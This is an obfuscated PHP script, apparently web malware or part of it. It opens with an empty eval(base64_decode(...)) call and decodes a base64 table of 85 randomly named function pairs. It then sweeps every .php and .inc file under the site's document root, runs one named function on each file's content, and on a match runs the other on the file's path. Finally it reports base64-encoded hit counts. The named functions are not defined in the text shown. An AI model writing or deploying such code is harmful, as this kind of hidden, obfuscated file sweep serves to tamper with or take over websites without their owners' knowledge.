eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo5OiJya2lncXphbWUiO2k6MjtzOjExOiJncHNuanl4am1neiI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6NToicmdtdmUiO2k6MjtzOjg6Imd4a3Bha2FnIjt9aToyO2E6Mzp7aTowO2k6MTU7aToxO3M6MTA6InJicXloZ2prbGIiO2k6MjtzOjU6ImdlcHJqIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6NToicmF3ZHIiO2k6MjtzOjQ6ImdpeXUiO31pOjQ7YTozOntpOjA7aToyMztpOjE7czo3OiJya2hwZnRxIjtpOjI7czo4OiJnZWpiZWt6byI7fWk6NTthOjM6e2k6MDtpOjM2O2k6MTtzOjc6InJic250bmwiO2k6MjtzOjExOiJneHByZ3RucHZ6ciI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjk6InJqZnR5dGN1bSI7aToyO3M6MTA6ImduenVicXFkZ2ciO31pOjc7YTozOntpOjA7aTo1NDtpOjE7czoxMToicnRkbXpqanB4Z3MiO2k6MjtzOjExOiJnaHBwb3ZkdGl4byI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjk6InJtcGd4d2x4ZiI7aToyO3M6NDoiZ3RxayI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjY6InJlbGt2cCI7aToyO3M6NzoiZ21zYWt0biI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6MTA6InJ6b3dtYW54YnEiO2k6MjtzOjc6ImdtbXZva2oiO31pOjExO2E6Mzp7aTowO2k6MTEwO2k6MTtzOjk6InJibmFmanlmYSI7aToyO3M6OToiZ2dmbHZoeWFxIjt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czo1OiJyd3p0aCI7aToyO3M6NDoiZ3NoZCI7fWk6MTM7YTozOntpOjA7aToxMTI7aToxO3M6NjoicndndHZvIjtpOjI7czoxMToiZ2FtZGhic2FjaGEiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjQ6InJib3AiO2k6MjtzOjY6ImdhbWVoZyI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6MTA6InJjZ2ltbGRlY2kiO2k6MjtzOjExOiJnYXVleXNuYWlzbSI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6NDoicnZ5YiI7aToyO3M6MTA6ImdidmRlYXlkdmQiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjY6InJqeG5kciI7aToyO3M6NjoiZ21vd2lpIjt9aToxODthOjM6e2k6MDtpOjEzMDtpOjE7czoxMToicmJ0amVxb2lkbGkiO2k6MjtzOjk6ImdnZmRlamloeSI7fWk6MTk7YTozOntpOjA7aToxMzQ7aToxO3M6MTA6InJjcm9nZW5lamsiO2k6MjtzOjU6ImdvdWR6Ijt9aToyMDthOjM6e2k6MDtpOjEzODtpOjE7czo4OiJyZXl5am9jdiI7aToyO3M6NjoiZ3lxa3BlIjt9aToyMTthOjM6e2k6MDtpOjE0ODtpOjE7czo3OiJyZW9senprIjtpOjI7czoxMToiZ3hsYW5xdWp0eXIiO31pOjIyO2E6Mzp7aTowO2k6MTU3O2k6MTtzOjg6InJ4ZG52a2hvIjtpOjI7czo3OiJnaGdydXFxIjt9aToyMzthOjM6e2k6MDtpOjE2MztpOjE7czo0OiJybWZmIjtpOjI7czo5OiJnYXB4cnVzeGIiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjEwOiJyd3J1bm9yY2NiIjtpOjI7czo4OiJnbmJxbXhxeSI7fWk6MjU7YTozOntpOjA7aToxNzQ7aToxO3M6OToicm5rcW5qcnZoIjtpOjI7czo2OiJnYXpqa2IiO31pOjI2O2E6Mzp7aTowO2k6MTc5O2k6MTtzOjExOiJyb3Bza3F6aG9uZSI7aToyO3M6NToiZ2ltYmYiO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjU6InJtaHVhIjtpOjI7czo3OiJnY3hzdXRzIjt9aToyODthOjM6e2k6MDtpOjE4OTtpOjE7czo1OiJyeHVxeiI7aToyO3M6OToiZ3NrZWtlbm94Ijt9aToyOTthOjM6e2k6MDtpOjE5MjtpOjE7czo0OiJyc2F6IjtpOjI7czoxMDoiZ2dramRiYWh3ZCI7fWk6MzA7YTozOntpOjA7aToxOTY7aToxO3M6NjoicnlicHJ0IjtpOjI7czo0OiJndHZ3Ijt9aTozMTthOjM6e2k6MDtpOjE5ODtpOjE7czo0OiJydmR4IjtpOjI7czo2OiJnbWZrcmEiO31pOjMyO2E6Mzp7aTowO2k6MTk5O2k6MTtzOjc6InJicGZubG0iO2k6MjtzOjEwOiJnbHh1cWVwaHFnIjt9aTozMzthOjM6e2k6MDtpOjIwMDtpOjE7czo4OiJyZmlicGlqeSI7aToyO3M6MTE6Imd1Z3doZ2Fkd3pwIjt9aTozNDthOjM6e2k6MDtpOjIwMTtpOjE7czo3OiJyeWZ3cGRnIjtpOjI7czo1OiJndnNzcCI7fWk6MzU7YTozOntpOjA7aToyMDM7aToxO3M6Nzoicmp4cHRqbCI7aToyO3M6MTE6ImdpcGh6c3VncXR0Ijt9aTozNjthOjM6e2k6MDtpOjIwNjtpOjE7czo4OiJydnhka2Z2ciI7aToyO3M6OToiZ2N2YXRhaWV3Ijt9aTozNzthOjM6e2k6MDtpOjIwOTtpOjE7czo0OiJyYXdpIjtpOjI7czoxMDoiZ2xpZXV4b2FtYyI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6Nzoicmlla3lreCI7aToyO3M6NDoiZ3hncyI7fWk6Mzk7YTozOntpOjA7aToyMTI7aToxO3M6MTE6InJzeXJwZ2duZG11IjtpOjI7czo4OiJncnBhemNzbiI7fWk6NDA7YTozOntpOjA7aToyMTM7aToxO3M6NToicnNlbW4iO2k6MjtzOjU6Imdqc21vIjt9aTo0MTthOjM6e2k6MDtpOjIxNDtpOjE7czoxMToicm50aGpwdW5wZ2IiO2k6MjtzOjEwOiJnYWpoaXJueW91Ijt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czoxMDoicm14dGlycG5mdCI7aToyO3M6NjoiZ2poZWl5Ijt9aTo0MzthOjM6e2k6MDtpOjIxNjtpOjE7czoxMToicmZ2cGVmc2FjdnIiO2k6MjtzOjU6Imdsa2V2Ijt9aTo0NDthOjM6e2k6MDtpOjIxNztpOjE7czo3OiJyd3RraHpwIjtpOjI7czo5OiJncHN2ZHN6ZHQiO31pOjQ1O2E6Mzp7aTowO2k6MjE4O2k6MTtzOjk6InJmZm1pZmVubiI7aToyO3M6OToiZ2R5ZHhkeG54Ijt9aTo0NjthOjM6e2k6MDtpOjIyMTtpOjE7czoxMToicmV4amRkYmlrdm0iO2k6MjtzOjQ6ImdvcngiO31pOjQ3O2E6Mzp7aTowO2k6MjIyO2k6MTtzOjY6InJ6a2Z5ZyI7aToyO3M6ODoiZ3d5ZmttdnEiO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjEwOiJya2RrY3FiaWh4IjtpOjI7czo5OiJncm55ZmtubmoiO31pOjQ5O2E6Mzp7aTowO2k6MjI0O2k6MTtzOjc6InJreHJleXUiO2k6MjtzOjk6Imd3Y2p2bG1tbCI7fWk6NTA7YTozOntpOjA7aToyMjU7aToxO3M6MTA6InJkY2htenBwcnYiO2k6MjtzOjc6ImdhbHhhZWIiO31pOjUxO2E6Mzp7aTowO2k6MjMwO2k6MTtzOjU6InJ1emZiIjtpOjI7czo3OiJnZWpva2JrIjt9aTo1MjthOjM6e2k6MDtpOjIzMjtpOjE7czo5OiJyZmdtaG13b2YiO2k6MjtzOjk6Imd2emt2bnhuYSI7fWk6NTM7YTozOntpOjA7aToyMzU7aToxO3M6ODoicnllamhoYmEiO2k6MjtzOjk6Imd2ZGlqdW5nbyI7fWk6NTQ7YTozOntpOjA7aToyMzY7aToxO3M6NjoicndkcWFzIjtpOjI7czo3OiJnbW90d2plIjt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo2OiJyamt0bXMiO2k6MjtzOjU6ImdocmtvIjt9aTo1NjthOjM6e2k6MDtpOjIzODtpOjE7czo1OiJydmVhdiI7aToyO3M6MTA6ImdiY2lleWZrdGwiO31pOjU3O2E6Mzp7aTowO2k6MjM5O2k6MTtzOjg6InJpaXlqaHdmIjtpOjI7czo1OiJnemhudCI7fWk6NTg7YTozOntpOjA7aToyNDA7aToxO3M6NToicmlub2oiO2k6MjtzOjg6Imd4bmRrYW54Ijt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czoxMToicmNka2ppeG5pdWUiO2k6MjtzOjc6ImdrcGhqYmkiO31pOjYwO2E6Mzp7aTowO2k6MjQyO2k6MTtzOjY6InJnc2xxbSI7aToyO3M6NDoiZ2h1byI7fWk6NjE7YTozOntpOjA7aToyNDM7aToxO3M6Njoicm9xb3JsIjtpOjI7czoxMToiZ3hlY2NmeHh2bW8iO31pOjYyO2E6Mzp7aTowO2k6MjQ0O2k6MTtzOjg6InJpaWJoYXh5IjtpOjI7czo2OiJnZXNmcGoiO31pOjYzO2E6Mzp7aTowO2k6MjQ1O2k6MTtzOjg6InJybXR6aWhjIjtpOjI7czo5OiJnaWR5d21hcHkiO31pOjY0O2E6Mzp7aTowO2k6MjQ2O2k6MTtzOjQ6InJiZmciO2k6MjtzOjk6ImdheW9vZGthcSI7fWk6NjU7YTozOntpOjA7aToyNDc7aToxO3M6Nzoicmx6YW9idyI7aToyO3M6NzoiZ21ianhvZiI7fWk6NjY7YTozOntpOjA7aToyNDg7aToxO3M6MTE6InJnbWV2b2Z6dmRzIjtpOjI7czoxMToiZ2xiYXRmdXdqcmQiO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjk6InJxbmVianFqZCI7aToyO3M6MTA6ImdsbnpxdGR0ZXAiO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjk6InJod2dkYW9jcSI7aToyO3M6NDoiZ2N3ZCI7fWk6Njk7YTozOntpOjA7aToyNTE7aToxO3M6MTA6InJ1b3FpaWphZmUiO2k6MjtzOjc6Imd5YWFudGYiO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjEwOiJybGlwamJucWRxIjtpOjI7czo0OiJnZW91Ijt9aTo3MTthOjM6e2k6MDtpOjI1MztpOjE7czoxMDoicmljamZoaXh2YyI7aToyO3M6NjoiZ2Z4bHpvIjt9aTo3MjthOjM6e2k6MDtpOjI1NDtpOjE7czo1OiJyYnNnbCI7aToyO3M6MTA6Imdja2d4ZWFlZHciO31pOjczO2E6Mzp7aTowO2k6MjU1O2k6MTtzOjExOiJydm9hdGVodnplaCI7aToyO3M6MTE6Imdua2hncXFpb2ZyIjt9aTo3NDthOjM6e2k6MDtpOjI1NjtpOjE7czoxMDoicnRxbmdhenJzdCI7aToyO3M6ODoiZ2FqcnFydWUiO31pOjc1O2E6Mzp7aTowO2k6MjU3O2k6MTtzOjExOiJyd3ZoY29lYXhoaiI7aToyO3M6NDoiZ21ydiI7fWk6NzY7YTozOntpOjA7aToyNTg7aToxO3M6NDoicmtreSI7aToyO3M6OToiZ3RhYndjc29jIjt9aTo3NzthOjM6e2k6MDtpOjI1OTtpOjE7czo2OiJyb2l2eXQiO2k6MjtzOjg6ImdjZXd3YWhlIjt9aTo3ODthOjM6e2k6MDtpOjI2MDtpOjE7czoxMToicmVqeGtxcmh4engiO2k6MjtzOjY6ImdjZ2dxdyI7fWk6Nzk7YTozOntpOjA7aToyNjE7aToxO3M6NzoicnRteWpkcSI7aToyO3M6NzoiZ2dxdGF5ayI7fWk6ODA7YTozOntpOjA7aToyNjI7aToxO3M6Njoicm5oY3hwIjtpOjI7czo2OiJnZmh3cWwiO31pOjgxO2E6Mzp7aTowO2k6MjYzO2k6MTtzOjk6InJybmpwZWpmYiI7aToyO3M6NToiZ2R1amwiO31pOjgyO2E6Mzp7aTowO2k6MjY0O2k6MTtzOjEwOiJyaG54ZG94ZGdxIjtpOjI7czoxMToiZ3lpZXR5aG93b3YiO31pOjgzO2E6Mzp7aTowO2k6MjY1O2k6MTtzOjQ6InJ4Z2giO2k6MjtzOjk6Imdjb2hvanV5cSI7fWk6ODQ7YTozOntpOjA7aToyNjY7aToxO3M6NzoicnR1dXlkYSI7aToyO3M6MTE6ImdkeGFveHh4aGR1Ijt9fQ=="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();